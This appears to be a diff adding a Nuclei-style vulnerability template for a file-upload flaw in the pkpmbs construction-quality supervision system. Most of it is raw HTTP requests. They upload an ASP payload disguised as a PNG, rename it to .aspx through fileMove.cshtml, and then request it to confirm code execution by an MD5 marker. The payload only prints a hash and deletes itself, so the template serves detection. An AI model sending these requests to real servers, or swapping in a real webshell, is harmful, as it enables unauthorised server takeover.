@@ -1,0 +1,47 @@
+id: pkpmbs-FileUpload-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: pkpmbs 建设工程质量监督系统,是湖南建研信息技术股份有限公司下的一款工程管理软件，该系统FileUpload.ashx 处存在文件上传漏洞，攻击者可上传webshell控制服务器。
+  reference:
+    - https://github.com/zan8in/pxplan/blob/fd87ef720bf9e7550512ef22bf1f84c3895e8b1c/goby_pocs/10-13-crack/redteam_20230914132632/CVD-2023-1620.go#L14
+    - http://kpanda.wiki/#/Vulnhub/P9-2pkpmbs-%E5%BB%BA%E8%AE%BE%E5%B7%A5%E7%A8%8B%E8%B4%A8%E9%87%8F%E7%9B%91%E7%9D%A3%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=p9-2pkpmbs-%e5%bb%ba%e8%ae%be%e5%b7%a5%e7%a8%8b%e8%b4%a8%e9%87%8f%e7%9b%91%e7%9d%a3%e7%b3%bb%e7%bb%9f-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
+  tags: tags
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(8)}}"
+http:
+  - raw:
+      - |-
+        POST /Platform/System/FileUpload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/57.0.578.100 Safari/537.36
+        Accept-Encoding: gzip
+        Connection: close
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Content-Type: multipart/form-data; boundary=----YsOxWxSvj1KyZow1PTs{{boundary}}
+        Content-Length: 298
+
+        ------YsOxWxSvj1KyZow1PTs{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.png"
+        Content-Type: image/png
+
+         <% Response.Write chr(101)&chr(49)&chr(54)&chr(53)&chr(52)&chr(50)&chr(49)&chr(49)&chr(49)&chr(48)&chr(98)&chr(97)&chr(48)&chr(51)&chr(48)&chr(57)&chr(57)&chr(97)&chr(49)&chr(99)&chr(48)&chr(51)&chr(57)&chr(51)&chr(51)&chr(55)&chr(51)&chr(99)&chr(53)&chr(98)&chr(52)&chr(51) CreateObject("Scripting.FileSystemObject").DeleteFile(server.mappath(Request.ServerVariables("SCRIPT_NAME"))) %>
+        ------YsOxWxSvj1KyZow1PTs{{boundary}}
+        Content-Disposition: form-data; name="target"
+
+        /Applications/SkillDevelopAndEHS/
+        ------YsOxWxSvj1KyZow1PTs{{boundary}}--
+      - |-
+        GET /Applications/SkillDevelopAndEHS/fileMove.cshtml?filePath={{filename}}.png&factFilePath={{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}        
+      - |-
+        GET /Applications/SkillDevelopAndEHS/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
